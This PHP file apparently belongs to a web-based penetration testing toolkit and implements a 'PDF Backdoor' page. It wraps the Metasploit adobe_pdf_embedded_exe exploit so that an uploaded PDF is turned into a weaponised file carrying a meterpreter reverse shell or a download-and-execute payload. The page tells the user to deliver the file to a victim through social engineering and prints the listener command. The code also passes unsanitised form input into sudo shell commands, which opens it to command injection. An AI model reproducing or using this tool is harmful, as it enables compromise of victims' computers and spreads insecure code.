<?php /***************************************************************************
 Copyright (C) 2014 Rakesh Pandey
 Written by Rakesh Pandey <rakeshpandey@karunya.edu.in>.
 
 This file is part of Penetration Testing Toolkit, a web interface for various ethical hacking tools.
 
 Penetration Testing Toolkit is free software; you can redistribute it and/or modify it 
 under the terms of the GNU General Public License as published by the Free
 Software Foundation; either version 2 of the License, or (at your option)
 any later version. 

 Penetration Testing Toolkit is distributed in the hope that it will be useful, but WITHOUT 
 ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or 
 FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for 
 more details.

 You should have received a copy of the GNU General Public License along
 with dpkg-scripts; if not, write to the Free Software Foundation, Inc.,
 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.
***************************************************************************/?>
<?php
require_once 'layout.php';
require_once 'u.php';
?>

<section id="main" class="column">
		
		<h4 class="alert_info">Welcome to the Web Based Penetration Testing Toolkit.</h4>
		
		
		
		
		<div class="clear"></div>
		
		<article class="module width_full">
			<header><h3>PDF Backdoor</h3></header>
				<div class="module_content">
<form name="form1" action="" method="post" enctype="multipart/form-data">
						<fieldset>
							<label>Enter Your IP Address</label>
                                                        <input type="text" name="ip" value="" >
						</fieldset>
    <fieldset>
							<label>Enter Port to Use</label>
                                                        <input type="text" name="port" value="4444" >
                                                        </fieldset>
    
   
                                         <fieldset>
							<label>Enter Package Name</label>
                                                        <input type="text" name="pkg" value="temp.pdf" >
						</fieldset>
    <fieldset>
							<label>Upload a PDF file</label>
                                                        <p> <input type="file" name="userfile" value="Upload"  style="float: left;width: 92%"></p>
						</fieldset>
    
   		                                      
<fieldset>
        <label>Instructions</label><br>
        <p style="margin-left: 1%">To Upload a file of size more than <b>2M</b>, You need change your  Apache php.ini file</p>
        <p style="margin-left: 1%">In Debian/Ubuntu based systems probably you can find <b>/etc/php5/apache/php.inf</b></p>
        <p style="margin-left: 1%"><em>Example:</em></p>
        <ul>
            <li>post_max_size = 750M</li>
            <li>upload_max_filesize = 750M</li>
            <li>max_execution_time = 5000</li>
            <li>max_input_time = 5000</li>
            <li>memory_limit = 1000M</li>
        </ul>
        <p style="margin-left: 1%">Then restart your <b>apache server</b> by typing <b>sudo service apache2 restart</b>
    </fieldset>
       
 <fieldset>
        <label>Choose a Payload</label><br/>
        <p><input  type="radio" value="windows/download_exec" name="c"> windows/download_exec </p>
        <p><input type="radio" value="windows/messagebox" name="c">Windows/messagebox </p>
        <p><input type="radio" value="windows/meterpreter/reverse_tcp" name="c" checked="true"> windows/meterpreter/reverse_tcp</p>
    </fieldset>    
        
   
						
		
						<div class="clear"></div>
				</div>
			<footer>
				<div class="submit_link">
					
                                    <input type="submit" name="submit" value="Start Now" class="alt_btn" id="submit">
                                    <a href="deb.php"><input type="button" value="Reset" id="reset"></a>
				</div>
			</footer>
		</article><!-- end of post new article -->
                
               <?php
               
                if(isset($_POST['submit']))
                {
                    $ip=$_POST['ip'];
                    $port=$_POST['port'];
                  
                    $pkg=$_POST['pkg'];
                     
                     $c=$_POST['c'];

        
               
               if($ip==''||$port==''){
                   
                   echo "<script type='text/javascript'>$.msg({fadeIn : 500,fadeOut : 500,bgPath : 'dlgs/',  content : 'You Have not entered datas correctly...'});</script>";
              }
               
 else {
      
                   require_once 'loading.php';
                   exec("sudo rm -r exploits/ && sudo mkdir exploits && sudo chmod 777 -R exploits/");  
             
     if (move_uploaded_file($_FILES['userfile']['tmp_name'], $pkg)) {
    echo "File is valid, and was successfully uploaded.\n"."<br/>";
    shell("echo '[Wait] While I generate your payload......'");
    exec("sudo chmod 777 $pkg");
    exec("sudo msfcli exploit/windows/fileformat/adobe_pdf_embedded_exe LHOST=$ip LPORT=$port INFILENAME=/var/www/lab/$pkg  FILENAME=veer.pdf PAYLOAD=$c E
");                      
    shell("sudo mv /root/.msf4/local/veer.pdf exploits/$pkg");
                        exec("sudo rm $pkg && sudo chmod 755  exploits/$pkg");
                           exec("sudo zip exploits/$pkg.zip exploits/$pkg ");
                           
                          
      echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'</p>';
echo '<p><b>PAYLOAD</b>                   -->'.$c.'</p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD zip format @</b>  --><a href=exploits/'.$pkg.'.zip>Click here</a>';
echo '<p><b>AFFECTED SYSTEMS ARE</b>      --> Adobe Reader v8.x, v9.x (Windows OS)</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques  ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD='.$c.' LHOST='.$ip.' LPORT='.$port.' E'; 

}else {
    echo "Possible file upload attack!\n";
}



print "</pre>";
$host=$_SERVER['SERVER_ADDR'];
	        echo "<p>To Open Terminal Click <a target='_blank' href='https://$host:4200/'>here</a></p>";
 
         echo '</div>
                                    <footer>
				<div align="left">
					
					<h3>Thank You!</h3>
                                        
				</div>
			</footer>
		</article><!-- end of styles article -->
                 <h4 class="alert_success">Succeeded </h4>
                 
 ';
         
 }
               
 }            
                     
    
                
 ?>
                
		<div class="spacer"></div>
	</section>
</body>
</html>
